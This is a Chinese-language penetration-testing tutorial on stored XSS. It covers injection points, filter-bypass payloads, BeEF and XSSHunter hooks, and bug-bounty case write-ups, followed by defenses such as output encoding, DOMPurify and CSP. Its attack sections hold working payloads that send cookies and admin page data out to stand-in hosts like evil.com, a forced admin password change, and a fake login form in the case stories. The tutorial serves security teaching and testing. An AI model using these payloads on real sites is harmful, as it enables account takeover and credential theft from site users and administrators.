---
title: 存储型XSS挖掘与利用
date: 2025-03-01 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: 存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论/富文本/个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef/XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。
---

## 概述

存储型 XSS（Stored/Persistent XSS）是跨站脚本中危害最大的一类：payload 写入数据库后，每个访问页面的用户都自动中招，无需钓鱼链接。

```
攻击者 ──POST──→ 服务端 ──INSERT──→ 数据库
                                      │
受害者A ───GET──→ 服务端 ←──SELECT─── 数据库（返回 payload）
受害者B ───GET──→ 触发   管理员 ───GET──→ 触发
```

反射型 XSS 是"一次链接、一个受害者"，存储型 XSS 是一经植入便持续生效的"后门"。

---

## 常见入口

### 1. 评论区 / 留言板

最经典的入口。恶意评论提交后，其他用户浏览评论区即触发。

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

- 提交后刷新页面，确认 payload 是否原样输出
- 查看页面源代码，判断 HTML 实体编码情况
- 有审核机制需等审核通过后再验证

### 2. 用户个人资料

昵称、签名、简介等字段后端常当作"受信任数据"直接输出，过滤较松。

```html
<a href="/user/123"><script>alert(1)</script></a>
<!-- 改昵称为 -->
<img src=x onerror=fetch('//xss.report?c='+document.cookie)>
```

SRC 中常有人用此招打到客服/管理后台。

### 3. 富文本编辑器

UEditor、KindEditor、CKEditor、Quill、TinyMCE 等允许提交 HTML，后端必须白名单过滤。

```html
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">点我</a>
<iframe src="javascript:alert(1)"></iframe>
<div style="background:url(javascript:alert(1))">
```

### 4. 文件上传相关

文件名、描述、EXIF、SVG 内容展示时未编码即可触发。

```html
<!-- 文件名 --> <img src=x onerror=alert(1)>.jpg

<!-- SVG 内嵌脚本 -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
```

### 5. 站内信 / 私信

发件人可控内容在收件人界面触发；客服系统尤为高危——客服打开恶意工单即中招。

---

## 存储上下文的过滤绕过

存储型 payload 经历 **写入过滤 → 入库 → 读出渲染** 全链路：

```
用户输入 → [前端过滤(可绕过)] → [WAF] → [后端过滤] → [入库] → [读出渲染]
                ↑                              ↑              ↑
          仅用于用户体验                   正则/关键词      输出编码是最后防线
```

**大小写混写：**
`<ScRiPt>alert(1)</sCrIpT>`  /  `<ImG sRc=x OnErRoR=alert(1)>`

**双写绕过**（后端只做一次替换时）：`<scr<script>ipt>alert(1)</scr</script>ipt>`

**编码绕过：**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
```

**换行/反引号：**
```html
<img src=x onerror=
alert(1)>
<script>alert`1`</script>
```

**冷门事件属性**（WAF 只拦 onerror/onload，HTML5 有 100+ 事件）：
```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<svg><animate onbegin=alert(1)>
<body onpageshow=alert(1)>
```

**二次渲染差异：** 同一数据前台做了 HTML 编码，后台管理列表却用 `innerHTML` 直接渲染——专门打管理员。

---

## XSS 平台联动

手动 `alert(1)` 只能证明漏洞存在，实战需用 XSS 平台接管浏览器。

### Beef

```bash
git clone https://github.com/beefproject/beef.git
cd beef && ./install && ./beef
# 面板: http://127.0.0.1:3000/ui/panel  Hook: http://<ip>:3000/hook.js
```

注入 payload：`<script src="http://<your-ip>:3000/hook.js"></script>`

| 模块 | 功能 | 模块 | 功能 |
|------|------|------|------|
| Get Cookie | 窃取 Cookie | Screenshot | 截屏 |
| Keylogger | 键盘记录 | Port Scanner | 内网扫描 |
| Redirect | 钓鱼跳转 | Get Form Values | 抓取表单 |

### XSSHunter / BlueLotus

```html
<img src=x onerror="new Image().src='//<sub>.xss.ht/log?c='+document.cookie">
```

- **XSSHunter**：轻量盲打平台，Burp Collaborator 风格
- **BlueLotus（蓝莲花）**：开源多项目 XSS 数据收集平台

### Cookie 窃取与 HttpOnly 绕过

常规窃取（对非 HttpOnly Cookie 有效）：
```javascript
new Image().src='//evil.com/steal?c='+document.cookie
```

`HttpOnly` Cookie 禁止 JS 读取，绕过思路：

```javascript
// 思路1：不偷 Cookie，借浏览器代劳
fetch('/admin/user/edit', {method:'POST', credentials:'include',
  body:'id=1&password=hacked123'});

// 思路2：回传页面敏感数据
fetch('/admin/user/list').then(r=>r.text())
  .then(d=>new Image().src='//evil.com/log?data='+btoa(d));

// 思路3：TRACE 方法反射请求头
var x=new XMLHttpRequest(); x.open('TRACE','/',false); x.send();
new Image().src='//evil.com/?'+x.responseText;
```

---

## SRC 实战案例

### 案例一：评论 XSS → 管理员劫持

某电商平台商家后台：

1. 商品评论区提交 `<img src=x onerror=alert(1)>`
2. 前台 HTML 编码为 `&lt;img src=x...`——看似安全
3. 但后台评论审核列表用 `innerHTML` 直接渲染
4. 注入 Beef hook：`<script src="http://x.x.x.x:3000/hook.js"></script>`
5. 次日客服审核时中招，Beef 截屏确认为后台管理页
6. 用 Page Modification 模块修改密码表单 action，劫持管理员新密码 —— 高危，赏金 8000 元

**教训：** 同一数据前台/后台渲染方式可能不同，必须两处都查。

### 案例二：富文本实体编码绕过

某知识库系统自研编辑器：

1. `<script>alert(1)</script>` → 被删除；`<img src=x onerror=alert(1)>` → `onerror` 被删
2. `<a>` 标签允许 `href` 但拦截字符串 `javascript:`
3. HTML 实体绕过：`<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>` → 成功
4. 在文章末尾插入伪造登录框，访客输入凭证后外传至攻击者服务器
5. 文章公开可见，影响平台全部用户 —— 高危，赏金 5000 元

### 案例三：SVG 头像 + EXIF XSS

某社交平台：

1. 上传 SVG 头像含 `<script>alert(1)</script>` → WAF 拦截
2. 改用 `<svg xmlns="..."><g onload="alert(1)"></g></svg>` → 上传成功
3. 个人主页直接渲染 SVG → XSS 触发
4. 扩展：JPEG 图片 EXIF Comment 写入 payload，图片信息页输出来编码 → 再次触发

**教训：** SVG 是 XML，支持完整 JS 事件模型；EXIF 元数据也是不可信输入。

---

## 挖掘 Checklist

```
[ ] 文本输入框：昵称、签名、标题、正文、评论区
[ ] 文件上传：文件名、EXIF、SVG 内容、文件描述
[ ] 富文本编辑器：事件属性、伪协议、iframe/embed
[ ] 站内信/私信：收发两端渲染一致性
[ ] 前台/后台同一数据渲染差异（重中之重）
[ ] 换行、反引号、HTML 实体、Unicode 编码绕过
[ ] SVG <use> / <set> / <animate> 冷门向量
[ ] CSP 头是否限制 inline script 和 eval
[ ] PUT/PATCH 接口过滤是否比 POST 松
```

---

## 防御方案

### 1. 输出编码——最后防线

按上下文选编码策略：

| 上下文 | 编码 | 示例 |
|--------|------|------|
| HTML 标签间 | HTML 实体 | `&lt;` `&gt;` `&amp;` `&quot;` |
| HTML 属性内 | 属性编码 | 同上 + 引号转义 |
| JavaScript 内 | Unicode 转义 | `<` `>` |
| CSS 内 | CSS 转义 | `\3C` `\3E` |
| URL 内 | URL 编码 | `%3C` `%3E` |

```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
// Java JSTL
<c:out value="${input}" />
// Python Django 自动转义
{{ input }}     // 安全
{{ input|safe }} // 危险！
```

### 2. 富文本白名单过滤

**DOMPurify：**
```javascript
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b','i','em','strong','a','p','br','ul','ol','li'],
  ALLOWED_ATTR: ['href','title','target']
});
```

服务端：Java: OWASP Java HTML Sanitizer / PHP: HTML Purifier / Python: Bleach / .NET: HtmlSanitizer

### 3. CSP 纵深防御

即使 XSS 注入成功，CSP 也能阻止执行：

```
Content-Security-Policy:
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
  report-uri /csp-violation-report;
```

| 指令 | 作用 |
|------|------|
| `script-src 'self'` | 禁止内联 script / 事件属性 |
| `'nonce-{random}'` | 配合 nonce 允许合法内联 |
| `object-src 'none'` | 禁用 `<embed>`/`<object>` |
| `report-uri` | 收集违规报告 |

### 4. Cookie 加固

```http
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict; Path=/
```
**HttpOnly** 禁止 JS 读取；**Secure** 仅 HTTPS；**SameSite=Strict** 防跨站携带。

### 5. 纵深防御流

```
输入校验(服务端) → 富文本清洗(白名单) → 输出编码(按上下文) → CSP头(最终兜底)
```

---

## 常见踩坑

**坑1：前端过滤当安全措施。** 前端 JS 限制可被 Burp Suite 直接绕过，安全校验必须在服务端。

**坑2：有 WAF 就不做输出编码。** WAF 是特征匹配不是安全保底，输出编码必须做。

**坑3：innerHTML 误用。**
```javascript
el.innerHTML = user_input;   // 危险：解析 HTML
el.textContent = user_input; // 安全：纯文本
```

**坑4：JSON.parse 后丢给 innerHTML。** 服务端 JSON 编码了 HTML，parse 后恢复原字符串，innerHTML 照样解析。

**坑5：`javascript:` 伪协议。** 允许 `<a>` 标签时必须在 `href` 中屏蔽 `javascript:` 和 `data:`。

**坑6：只测 POST 不测 PUT/PATCH。** 修改操作的过滤往往比创建操作松，两边都要覆盖。

---

## 免责声明

> 本文所述技术仅用于安全研究与授权的渗透测试活动。未经授权的测试、利用或攻击行为均属违法。作者不对读者滥用文中技术所产生的任何后果承担责任。所有安全测试须在获得明确书面授权的前提下进行，遵守《网络安全法》及相关法律法规。

---

## 参考

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger - Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [Beef Project](https://beefproject.com/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Level 3](https://www.w3.org/TR/CSP3/)
